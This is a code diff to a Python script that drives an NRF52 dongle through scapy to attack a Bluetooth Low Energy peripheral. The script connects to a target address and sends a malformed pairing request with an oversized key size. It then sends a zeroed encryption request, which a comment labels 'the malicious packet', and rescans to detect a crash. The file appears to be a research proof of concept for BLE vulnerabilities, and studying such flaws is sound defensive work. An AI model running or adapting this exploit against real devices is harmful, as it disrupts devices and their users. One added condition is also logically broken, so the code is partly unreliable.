@@ -8,7 +8,7 @@ from time import sleep
 sys.path.insert(0, os.getcwd() + '/libs')
 import colorama
 from colorama import Fore
-from drivers.NRF52_dongle import NRF52Dongle
+from drivers.NRF52_dongle import NRF52Dongle, NORDIC_BLE
 from scapy.layers.bluetooth4LE import *
 from scapy.layers.bluetooth import *
 from scapy.utils import wrpcap
@@ -25,24 +25,10 @@ slave_addr_type = 0
 # Autoreset colors
 colorama.init(autoreset=True)
 
-# Get serial port from command line
 if len(sys.argv) >= 2:
-    serial_port = sys.argv[1]
-elif platform.system() == 'Linux':
-    serial_port = '/dev/ttyACM0'
-elif platform.system() == 'Windows':
-    serial_port = 'COM1'
+    advertiser_address = sys.argv[1].upper()
 else:
-    print(Fore.RED + 'Platform not identified')
-    sys.exit(0)
-
-print(Fore.YELLOW + 'Serial port: ' + serial_port)
-
-# Get advertiser_address from command line (peripheral addr)
-if len(sys.argv) >= 3:
-    advertiser_address = sys.argv[2].lower()
-else:
-    advertiser_address = 'A4:C1:38:D8:AD:A9'
+    advertiser_address = 'A4:C1:38:D8:AD:B8'
 
 print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 
@@ -64,11 +50,13 @@ def scan_timeout():
 
 
 # Open serial port of NRF52 Dongle
-driver = NRF52Dongle(serial_port, '115200')
+driver = NRF52Dongle()
 # Send scan request
 scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
     ScanA=master_address,
     AdvA=advertiser_address)
+# req = scan_req.__bytes__()
+# print([hex(req[i]) for i in range(len(req))])
 driver.send(scan_req)
 
 start_timeout('scan_timeout', 2, scan_timeout)
@@ -88,13 +76,9 @@ while True:
                 print(Fore.RED + 'NRF52 Dongle not detected')
                 sys.exit(0)
             continue
-        elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
-            update_timeout('scan_timeout')
-            # Print slave data channel PDUs summary
-            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
         # --------------- Process Link Layer Packets here ------------------------------------
         # Check if packet from advertised is received
-        if (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
+        if (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
             connecting = True
             update_timeout('scan_timeout')
             disable_timeout('crash_timeout')
@@ -122,11 +106,11 @@ while True:
             connecting = False
             print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
             # Send version indication request
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_VERSION_IND(version='4.2')
             driver.send(pkt)
 
         elif LL_VERSION_IND in pkt:
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_LENGTH_REQ(
                 max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
             driver.send(pkt)
 
@@ -136,16 +120,21 @@ while True:
                 iocap=4, oob=0, authentication=0x05, max_key_size=253, initiator_key_distribution=0x07,
                 responder_key_distribution=0x07)
             driver.send(pairing_req)
-            wrpcap(os.path.basename(__file__).split('.')[0] + '.pcap',
-                   NORDIC_BLE(board=75, protocol=2, flags=0x3) / pairing_req)  # save packet just sent
+            # wrpcap(os.path.basename(__file__).split('.')[0] + '.pcap',
+            #        NORDIC_BLE(board=75, protocol=2, flags=0x3) / pairing_req)  # save packet just sent
 
-        elif SM_Pairing_Response in pkt:
+        elif (SM_Failed or SM_Pairing_Response) in pkt:
             enc_request = BTLE(
-                access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ()  # encryption request with 0 values
+                access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_ENC_REQ()  # encryption request with 0 values
             driver.send(enc_request)  # Send the malicious packet (2/2)
             end_connection = True
+        
+        elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
+            update_timeout('scan_timeout')
+            # Print slave data channel PDUs summary
+            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
 
-        elif end_connection == True:
+        if end_connection == True:
             end_connection = False
             scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                 ScanA=master_address,
